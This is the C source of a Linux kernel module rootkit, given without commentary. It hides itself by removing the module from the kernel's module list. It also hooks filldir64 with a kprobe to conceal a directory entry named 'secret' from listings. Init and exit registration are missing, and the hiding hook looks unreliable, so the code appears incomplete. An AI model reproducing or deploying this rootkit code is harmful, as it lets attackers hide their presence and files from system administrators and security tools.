#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/list.h>

static struct kprobe kp;
static struct list_head *prev_module;
static short hidden = 0;

void hidden_init(void);
void hidden_exit(void);

static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
    char *dir = (char *)regs->si;
    if (strcmp(dir, "secret") == 0) {
        regs->dx = 0;
    }
    return 0;
}

static void hide(void) {
    if (!hidden) {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
}

static void show(void) {
    if (hidden) {
        list_add(&THIS_MODULE->list, prev_module);
        hidden = 0;
    }
}

void hidden_init(void) {
    int ret;

    kp.symbol_name = "filldir64";
    kp.pre_handler = handler_pre;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        return;
    }

    hide();
}

void hidden_exit(void) {
    unregister_kprobe(&kp);
    show();
}